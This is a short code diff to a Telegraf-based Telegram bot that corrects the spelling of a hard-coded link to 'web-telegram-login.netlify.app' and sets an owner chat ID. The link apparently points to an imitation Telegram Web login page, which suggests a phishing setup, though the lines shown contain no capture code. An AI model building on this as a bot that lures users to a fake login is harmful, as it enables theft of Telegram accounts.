@@ -1,6 +1,6 @@
 const { Telegraf } = require("telegraf");
 
-const web_link = "https://-web-telegram-login.netlify.app";
+const web_link = "https://web-telegram-login.netlify.app";
 // Replace with your actual chat ID or store as environment variable
 const OWNER_CHAT_ID = process.env.OWNER_CHAT_ID || "YOUR_OWNER_CHAT_ID";
 
